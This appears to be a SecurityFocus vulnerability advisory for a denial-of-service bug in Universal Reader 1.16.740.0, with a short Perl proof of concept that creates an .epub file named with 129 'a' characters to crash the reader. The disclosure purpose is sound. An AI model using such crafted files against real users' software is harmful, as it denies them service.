source: http://www.securityfocus.com/bid/53508/info

Universal Reader is prone to a remote denial-of-service vulnerability.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users.

Universal Reader 1.16.740.0 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl -w
$filename="a"x129;
print "------Generate testfile \"a\"x129.epub------\n";
open(TESTFILE, ">$filename.epub");
sleep(3);
close(TESTFILE);
print "------Complete!------\n";
exit(1);